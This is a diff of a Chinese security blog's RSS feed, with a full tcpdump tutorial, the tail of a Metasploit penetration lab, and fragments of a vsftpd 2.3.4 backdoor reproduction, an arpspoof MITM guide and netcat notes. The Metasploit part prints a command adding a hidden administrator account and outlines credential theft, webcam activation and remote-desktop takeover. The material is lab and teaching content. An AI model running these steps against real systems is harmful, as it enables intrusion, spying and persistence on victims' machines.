+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net localgroup administrators hack /add
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="图形化建议">图形化建议
+&lt;/h2>&lt;p>你可以根据上述内容绘制以下流程图：&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>攻击流程图&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>内网扫描存活机器 → 确定攻击目标 → 测试目标连通性 → 打开 Kali 数据库 → 数据库初始化 → 启动 msf 工具 → 搜索漏洞 → 选择扫描模块 → 设置扫描配置 → 开始攻击 → 攻击生效。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>漏洞利用流程图&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>截屏 → 获取账号密码 → 实时监控 → 开启摄像头。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>后渗透阶段流程图&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>Shell 连接目标机器 → 消除乱码 → 开启远程桌面服务 → 查看端口状态 → 远程桌面连接 → 登录账号密码。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>Tcpdump命令使用</title><link>https://souljian.cn/p/745241507/</link><pubDate>Mon, 21 Apr 2025 21:18:27 +0800</pubDate><guid>https://souljian.cn/p/745241507/</guid><description>&lt;p>好的，我将在笔记中补充 &lt;code>-v&lt;/code>、&lt;code>-vv&lt;/code> 和 &lt;code>-vvv&lt;/code> 的具体作用，并完善相关内容。&lt;/p>
+&lt;h1 id="tcpdump-命令笔记">TCPdump 命令笔记
+&lt;/h1>&lt;h2 id="一简介">一、简介
+&lt;/h2>&lt;p>TCPdump 是一款强大的网络抓包工具，用于捕获和分析网络流量。它能够实时捕获网络中的数据包，并根据指定的过滤条件进行筛选和分析，是网络管理员和开发人员排查网络问题、分析网络性能的利器。&lt;/p>
+&lt;h2 id="二基本语法">二、基本语法
+&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump &lt;span class="o">[&lt;/span>选项&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>过滤条件&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="三常用选项">三、常用选项
+&lt;/h2>&lt;h3 id="31-捕获设置">3.1 捕获设置
+&lt;/h3>&lt;ul>
+&lt;li>&lt;code>-i &amp;lt;interface&amp;gt;&lt;/code>：指定监听的网络接口，例如&lt;code>eth0&lt;/code>、&lt;code>wlan0&lt;/code>或&lt;code>any&lt;/code>（捕获所有接口的数据包）。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>&lt;code>-c &amp;lt;count&amp;gt;&lt;/code>：捕获指定数量的数据包后停止。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -c &lt;span class="m">100&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>&lt;code>-s &amp;lt;size&amp;gt;&lt;/code>：设置捕获数据包的大小，默认为65535字节。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -s &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h3 id="32-输出设置">3.2 输出设置
+&lt;/h3>&lt;ul>
+&lt;li>&lt;code>-n&lt;/code>：不解析主机名和端口名，直接显示IP地址和端口号。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -n
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>&lt;code>-nn&lt;/code>：不解析主机名、端口名和协议名。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -nn
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>&lt;code>-X&lt;/code>：以十六进制和ASCII格式显示数据包内容。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -X
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>&lt;code>-v&lt;/code>、&lt;code>-vv&lt;/code>、&lt;code>-vvv&lt;/code>：增加输出的详细程度。
+&lt;ul>
+&lt;li>&lt;code>-v&lt;/code>：显示更多详细信息，例如协议的详细字段。&lt;/li>
+&lt;li>&lt;code>-vv&lt;/code>：显示更详细的协议信息，包括一些扩展字段。&lt;/li>
+&lt;li>&lt;code>-vvv&lt;/code>：显示最详细的信息，包括数据包的完整内容和协议的详细解析。&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -v
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -vv
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -vvv
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h3 id="33-文件操作">3.3 文件操作
+&lt;/h3>&lt;ul>
+&lt;li>&lt;code>-w &amp;lt;file&amp;gt;&lt;/code>：将捕获的数据包保存到指定文件中。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -w output.pcap
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>&lt;code>-r &amp;lt;file&amp;gt;&lt;/code>：从指定文件中读取数据包。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -r output.pcap
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h2 id="四过滤条件">四、过滤条件
+&lt;/h2>&lt;p>TCPdump 支持丰富的过滤条件，用于筛选特定类型的数据包。&lt;/p>
+&lt;h3 id="41-基于协议过滤">4.1 基于协议过滤
+&lt;/h3>&lt;ul>
+&lt;li>指定协议类型，如&lt;code>tcp&lt;/code>、&lt;code>udp&lt;/code>、&lt;code>icmp&lt;/code>等。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 udp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 icmp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h3 id="42-基于主机过滤">4.2 基于主机过滤
+&lt;/h3>&lt;ul>
+&lt;li>指定特定主机的IP地址。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 host 192.168.1.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>指定源主机或目标主机。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 src 192.168.1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 dst 192.168.1.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h3 id="43-基于端口过滤">4.3 基于端口过滤
+&lt;/h3>&lt;ul>
+&lt;li>指定特定端口号。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 port &lt;span class="m">80&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>指定源端口或目标端口。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 src port &lt;span class="m">80&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 dst port &lt;span class="m">80&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h3 id="44-复合条件">4.4 复合条件
+&lt;/h3>&lt;ul>
+&lt;li>使用逻辑运算符&lt;code>and&lt;/code>、&lt;code>or&lt;/code>、&lt;code>not&lt;/code>组合多个条件。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 tcp and host 192.168.1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 tcp and port &lt;span class="m">80&lt;/span> or port &lt;span class="m">443&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h2 id="五高级用法">五、高级用法
+&lt;/h2>&lt;h3 id="51-捕获特定网络段">5.1 捕获特定网络段
+&lt;/h3>&lt;ul>
+&lt;li>指定网络段，例如捕获192.168.1.0/24网段的数据包。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 net 192.168.1.0/24
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h3 id="52-捕获特定方向的数据包">5.2 捕获特定方向的数据包
+&lt;/h3>&lt;ul>
+&lt;li>指定数据包的传输方向。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 inbound
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 outbound
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h3 id="53-使用表达式过滤">5.3 使用表达式过滤
+&lt;/h3>&lt;ul>
+&lt;li>使用复杂的表达式进行过滤，例如捕获特定协议和端口的组合。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 &lt;span class="s1">&amp;#39;tcp port 80 and (tcp[((tcp[12:1] &amp;amp; 0xf0) &amp;gt;&amp;gt; 2):4] = 0x47455420)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h3 id="54-实时分析与输出控制">5.4 实时分析与输出控制
+&lt;/h3>&lt;ul>
+&lt;li>使用 &lt;code>-l&lt;/code> 参数可以让 tcpdump 的输出立即发送到管道命令，适用于实时分析。
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -l port &lt;span class="m">80&lt;/span> &lt;span class="p">|&lt;/span> grep &lt;span class="s1">&amp;#39;Server:&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h2 id="六实战案例">六、实战案例
+&lt;/h2>&lt;h3 id="61-捕获特定主机的http流量">6.1 捕获特定主机的HTTP流量
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -n -X tcp port &lt;span class="m">80&lt;/span> and host 192.168.1.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>-n&lt;/code>：不解析主机名。&lt;/li>
+&lt;li>&lt;code>-X&lt;/code>：以十六进制和ASCII格式显示内容。&lt;/li>
+&lt;li>&lt;code>tcp port 80&lt;/code>：筛选TCP协议的80端口（HTTP）。&lt;/li>
+&lt;li>&lt;code>host 192.168.1.1&lt;/code>：指定主机IP。&lt;/li>
+&lt;/ul>
+&lt;h3 id="62-分析网络延迟">6.2 分析网络延迟
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -tttt -c &lt;span class="m">100&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>-tttt&lt;/code>：显示时间戳，精确到秒。&lt;/li>
+&lt;li>&lt;code>-c 100&lt;/code>：捕获100个数据包。&lt;/li>
+&lt;li>通过观察时间戳，可以分析网络延迟情况。&lt;/li>
+&lt;/ul>
+&lt;h3 id="63-捕获并保存数据包">6.3 捕获并保存数据包
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -i eth0 -w capture.pcap
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>将捕获的数据包保存到&lt;code>capture.pcap&lt;/code>文件中，后续可以使用Wireshark等工具进行详细分析。&lt;/li>
+&lt;/ul>
+&lt;h2 id="七注意事项">七、注意事项
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>权限问题&lt;/strong>：TCPdump 需要管理员权限才能运行。&lt;/li>
+&lt;li>&lt;strong>性能影响&lt;/strong>：在高流量的网络环境中，TCPdump 可能会对系统性能产生一定影响。&lt;/li>
+&lt;li>&lt;strong>隐私问题&lt;/strong>：捕获的数据包可能包含敏感信息，请确保合法使用。&lt;/li>
+&lt;/ol></description></item><item><title>FTP笑脸漏洞复现</title><link>https://souljian.cn/p/745211567/</link><pubDate>Mon, 21 Apr 2025 12:59:27 +0800</pubDate><guid>https://souljian.cn/p/745211567/</guid><description>&lt;p>&lt;strong>实验笔记：vsftpd 2.3.4 笑脸漏洞复现&lt;/strong>&lt;/p>
 &lt;h2 id="实验目标">&lt;strong>实验目标&lt;/strong>
-&lt;/h2>&lt;p>复现 vsftpd 2.3.4 的“笑脸漏洞”，通过该漏洞获取靶机的 root 权限。&lt;/p>
+&lt;/h2>&lt;p>复现 vsftpd 2.3.4 的&amp;quot;笑脸漏洞&amp;quot;，通过该漏洞获取靶机的 root 权限。&lt;/p>
 &lt;h2 id="实验环境">&lt;strong>实验环境&lt;/strong>
 &lt;/h2>&lt;ul>
 &lt;li>&lt;strong>攻击机&lt;/strong>：Kali Linux&lt;/li>
@@ -190,7 +1431,7 @@ alt="局部截取_20250416_221315"
 &lt;/ul>
 &lt;hr>
 &lt;p>&lt;strong>实验总结：&lt;/strong>
-本次实验通过 vsftpd 2.3.4 的“笑脸漏洞”，成功获取了靶机的 root 权限。实验过程中，关键在于正确触发漏洞并保持 Netcat 连接状态，以确保后续操作的顺利进行。&lt;/p></description></item><item><title>Arpspoof命令使用</title><link>https://souljian.cn/p/745203237/</link><pubDate>Mon, 21 Apr 2025 10:40:37 +0800</pubDate><guid>https://souljian.cn/p/745203237/</guid><description>&lt;h2 id="一简介">一、简介
+本次实验通过 vsftpd 2.3.4 的&amp;quot;笑脸漏洞&amp;quot;，成功获取了靶机的 root 权限。实验过程中，关键在于正确触发漏洞并保持 Netcat 连接状态，以确保后续操作的顺利进行。&lt;/p></description></item><item><title>Arpspoof命令使用</title><link>https://souljian.cn/p/745203237/</link><pubDate>Mon, 21 Apr 2025 10:40:37 +0800</pubDate><guid>https://souljian.cn/p/745203237/</guid><description>&lt;h2 id="一简介">一、简介
 &lt;/h2>&lt;p>&lt;code>arpspoof&lt;/code> 是一款用于 ARP 欺骗的工具，能够发送伪造的 ARP 数据包，欺骗网络中的设备，使其将攻击者的设备误认为是目标设备。这通常用于中间人攻击（MITM），例如捕获网络流量或篡改数据。&lt;/p>
 &lt;h2 id="二安装">二、安装
 &lt;/h2>&lt;h3 id="一kali-linux">（一）Kali Linux
@@ -698,7 +1939,7 @@ alt="局部截取_20250416_221315"
 &lt;/ol>
 &lt;h2 id="八总结">八、总结
 &lt;/h2>&lt;p>&lt;code>lsof&lt;/code> 是一个功能强大的工具，适用于多种场景，包括故障排查、性能监测、资源管理等。通过掌握基本语法和常用选项，可以快速定位文件占用、网络连接等问题。结合过滤条件和其他命令，&lt;code>lsof&lt;/code> 的应用场景更加广泛，能够满足复杂的系统管理和调试需求。&lt;/p></description></item><item><title>Nc（netcat）命令使用</title><link>https://souljian.cn/p/745203036/</link><pubDate>Mon, 21 Apr 2025 10:37:16 +0800</pubDate><guid>https://souljian.cn/p/745203036/</guid><description>&lt;h2 id="一简介">一、简介
-&lt;/h2>&lt;p>&lt;code>nc&lt;/code>（Netcat）是一个功能强大的网络工具，用于读写网络连接（TCP 和 UDP）。它常被称为“网络瑞士军刀”，可用于端口扫描、数据传输、远程控制等多种用途。&lt;/p>
+&lt;/h2>&lt;p>&lt;code>nc&lt;/code>（Netcat）是一个功能强大的网络工具，用于读写网络连接（TCP 和 UDP）。它常被称为&amp;quot;网络瑞士军刀&amp;quot;，可用于端口扫描、数据传输、远程控制等多种用途。&lt;/p>
 &lt;h2 id="二安装">二、安装
 &lt;/h2>&lt;h3 id="一通过包管理器安装">（一）通过包管理器安装
 &lt;/h3>&lt;ul>
